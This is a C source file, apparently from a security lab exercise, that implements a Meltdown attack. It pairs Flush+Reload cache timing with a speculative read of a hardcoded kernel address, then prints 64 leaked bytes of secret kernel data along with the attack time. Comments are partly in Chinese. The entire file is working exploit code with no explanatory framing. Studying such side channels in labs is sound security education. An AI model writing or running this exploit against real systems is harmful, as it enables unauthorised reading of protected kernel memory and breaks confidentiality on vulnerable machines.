#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <time.h>

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (270)
#define DELTA 1024

void flushSideChannel()
{
  int i;

  // 赋予初值 
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // 把cache中的数据全部清除到内存中
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /* 如果命中，则可能性加1 到时候只要取最有可能的结果即可 */
  }
}
/*********************** Flush + Reload ************************/

void meltdown_asm(unsigned long kernel_data_addr)
{
   char kernel_data = 0;
   
   // Give eax register something to do
   asm volatile(
       ".rept 1000;"                
       "add $0x141, %%eax;"
       ".endr;"                    
    
       :
       :
       : "eax"
   ); 
    
   // 这句指令将触发异常
   kernel_data = *(char*)kernel_data_addr;  
   array[kernel_data * 4096 + DELTA] += 1;              
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
   siglongjmp(jbuf, 1);
}

int main()
{
  int i, j, ret = 0;
  int k;
  clock_t t_start,t_end;
  
  t_start = clock();
  // Register signal handler
  signal(SIGSEGV, catch_segv);

  int fd = open("/proc/secret_data", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  
  
  for(k = 0;k < 64;k++) {
    memset(scores, 0, sizeof(scores));
    flushSideChannel();
  
	  
    // 在一个地址上尝试1000次 选择命中次数最多的.
    for (i = 0; i < 1000; i++) {
	  ret = pread(fd, NULL, 0, 0);
	  if (ret < 0) {
	    perror("pread");
	    break;
	  }
	
	
	  for (j = 0; j < 256; j++) 
		  _mm_clflush(&array[j * 4096 + DELTA]);

	  if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xffffffffc0f5b000+k); }

	  reloadSideChannelImproved();
    }


    int max = 0;
    for (i = 0; i < 256; i++) {
	  if (scores[max] < scores[i]) max = i;
    }
    printf("%d\t%c\n",max,max);
    //printf("The number of hits is %d\n", scores[max]);
  }

  t_end = clock();
  printf("The attack time :%lf\n",(double)(t_end-t_start) / CLOCKS_PER_SEC);
  return 0;
}